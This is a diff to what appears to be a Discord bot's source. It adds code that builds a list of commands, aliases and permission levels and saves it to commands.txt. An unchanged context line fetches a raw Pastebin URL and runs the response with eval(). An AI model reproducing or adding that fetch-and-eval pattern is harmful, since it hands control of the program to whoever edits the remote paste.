@@ -198,6 +198,69 @@ cooldown[Zhekoay.id] = 0;
 request(`https://pastebin.com/raw/7UWhbtSR`, function (error, response, body) {
   eval(body);
 
+
+let aliases = [];
+let ali = [];
+let total = 0;
+
+for (var key in cmds) {
+    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
+if(ali[key]) continue;
+total++
+if(typeof cmds[key].func == "undefined") continue;
+for (var alan in cmds) {
+    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
+if(cmds[alan].desc == cmds[key].desc && key !== alan){
+ali[alan] = true;
+};
+};
+};
+
+let str = `Made by ` + owner.tag + `
+Scripter and Developer of Astral
+Total Number of commands: ` + total + "\n\n" + "Aliases are split by '/'" + "\n\nCommands are sorted like the following: COMMAND----DESCRIPTION----PERMISSION LEVEL\n\n";
+
+for (var key in cmds) {
+    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
+if(aliases[key]){
+continue;
+};
+str = str + "\n" + prefix +key.toUpperCase();
+try{
+for (var alan in cmds) {
+    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
+if(cmds[alan].func == cmds[key].func && key !== alan){
+aliases[alan] = true;
+str = str + "/" + alan.toUpperCase();
+};
+};
+}catch(e){
+console.log(e);
+};
+for (var key1 in cmds) {
+    if (key1 === 'length' || !cmds.hasOwnProperty(key1)) continue;
+let desc="";
+if(key1 == key){
+desc = cmds[key1].desc || descs[key1];
+};
+if(desc !== ""){
+let perm = cmds[key1].perm;
+if(perm !== "All"){
+if(perm !== "Premium" && perm!=="Not Found") perm = perm + "s";
+if(perm!=="Not Found") perm = perm + " Only";
+};
+if(perm == "All") perm = "Everyone";
+str = str + "----" + desc + "----" + perm + "\n";
+};
+};
+};
+try{
+
+fs.writeFile('commands.txt', str, function (err) {
+  if (err) throw err;
+  //console.log('Saved!');
+});
+
 setInterval(()=>{
 refreshCmds();
 },5000);
